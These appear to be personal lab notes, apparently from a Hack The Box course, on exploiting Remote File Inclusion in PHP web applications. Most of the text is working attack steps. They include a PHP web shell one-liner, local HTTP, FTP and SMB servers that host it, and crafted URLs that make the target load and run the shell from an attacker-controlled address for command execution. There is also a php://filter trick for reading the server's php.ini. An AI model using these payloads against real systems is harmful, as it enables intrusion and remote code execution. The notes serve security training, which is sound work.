
the goal:

```bash
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|
## Verify RFI
`allow_url_include`
1- PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache
2- at (`/etc/php/X.Y/fpm/php.ini`) for Nginx

```bash
AhmaDb0x@htb[/htb]$ curl "http://94.237.58.78:55981/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

```bash
AhmaDb0x@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content. At first, `we should always start by trying to include a local URL`

let's use (`http://127.0.0.1:80/index.php`)
```bash
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

![Shipping containers and cranes at a port with user and PHP error information displayed.](https://academy.hackthebox.com/storage/modules/23/lfi_local_url_include.jpg)
override.

## DoS:
**Note:** It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.



## Remote Code Execution with RFI
```bash
AhmaDb0x@htb[/htb]$ echo '<?pystem($_GET["cmd"]); ?>' > shell.php
```
```bash
sudo python3 -m http.server 9999
```

```bash
http://<SERVER_IP>:<PORT>/index.php?language=http://10.10.14.60:9999/shell.php&cmd=id
```

## FTP
```bash
AhmaDb0x@htb[/htb]$ sudo python -m pyftpdlib -p 21
```

```bash
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

```bash
AhmaDb0x@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```


## SMB
vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation

Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.

```shell-session
AhmaDb0x@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
```

```bash
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```
`more likely to work if we were on the same network`, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.


---


